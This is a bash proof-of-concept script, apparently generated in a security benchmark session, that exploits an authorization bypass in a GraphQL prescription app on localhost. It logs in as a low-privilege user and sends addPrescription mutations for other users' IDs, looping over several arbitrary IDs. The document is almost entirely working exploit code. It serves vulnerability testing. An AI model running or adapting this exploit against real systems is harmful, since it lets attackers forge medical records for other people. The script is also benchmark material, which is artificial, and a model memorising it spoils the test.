#!/bin/bash
# POC: Demonstrates authorization bypass allowing authenticated user (userId=2) to create prescriptions for arbitrary userIds without proper authorization checks
# Target: ./repo
# Created: 2025-11-10T18:28:54.730Z
# Session: benchmark-XBEN-007-24-mhtgyyde

# Authorization Bypass POC - Authenticated User Can Create Prescriptions for Arbitrary userIds
# This POC demonstrates that an authenticated user can bypass authorization checks
# and create prescriptions for any userId by modifying the userId parameter in the GraphQL mutation

TARGET_URL="http://localhost:5003"
COOKIES_FILE="/tmp/cookies_auth_bypass.txt"

echo "[*] Authorization Bypass POC - Arbitrary Prescription Creation"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login as user:user (userId=2)
echo "[+] Step 1: Authenticating as user:user (userId=2)..."
curl -s -c "$COOKIES_FILE" -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user&password=user" > /dev/null

if [ ! -f "$COOKIES_FILE" ]; then
  echo "[-] Failed to authenticate. Aborting."
  exit 1
fi

echo "[+] Authentication successful. Session cookie saved."
echo ""

# Step 2: Attempt to create prescription for userId=1 (another user)
echo "[+] Step 2: Creating prescription for userId=1 (as authenticated user with userId=2)..."
RESPONSE=$(curl -s -b "$COOKIES_FILE" -X POST "$TARGET_URL/graphql" \
  -H 'Content-Type: application/json' \
  -d '{"query": "mutation($userId: Int!, $details: String!) { addPrescription(userId: $userId, prescriptionDetails: $details) { prescription { id userId prescriptionDetails } } }", "variables": {"userId": 1, "details": "Prescription created by user 2 for user 1"}}')

echo "[*] Response:"
echo "$RESPONSE"
echo ""

# Check if prescription was successfully created for userId=1
if echo "$RESPONSE" | grep -q '"userId":1'; then
  echo "[!] VULNERABILITY CONFIRMED: Prescription created for userId=1"
  echo "[!] Current user (userId=2) successfully created prescription for another user (userId=1)"
else
  echo "[-] Unexpected response. Vulnerability may not be present."
  exit 1
fi

echo ""

# Step 3: Test with multiple arbitrary userIds
echo "[+] Step 3: Testing with multiple arbitrary userIds..."
for uid in 3 4 5 10 100 999; do
  echo "[*] Attempting to create prescription for userId=$uid..."
  RESPONSE=$(curl -s -b "$COOKIES_FILE" -X POST "$TARGET_URL/graphql" \
    -H 'Content-Type: application/json' \
    -d "{\"query\": \"mutation(\$userId: Int!, \$details: String!) { addPrescription(userId: \$userId, prescriptionDetails: \$details) { prescription { id userId prescriptionDetails } } }\", \"variables\": {\"userId\": $uid, \"details\": \"Prescription for user $uid created by user 2\"}}")
  
  if echo "$RESPONSE" | grep -q "\"userId\":$uid"; then
    echo "[!] SUCCESS: Created prescription for userId=$uid"
  else
    echo "[-] Failed to create prescription for userId=$uid"
  fi
done

echo ""
echo "[!] AUTHORIZATION BYPASS CONFIRMED"
echo "[!] Authenticated user can create prescriptions for arbitrary userIds"
echo "[!] Application does not validate that users can only create prescriptions for themselves"

# Cleanup
rm -f "$COOKIES_FILE"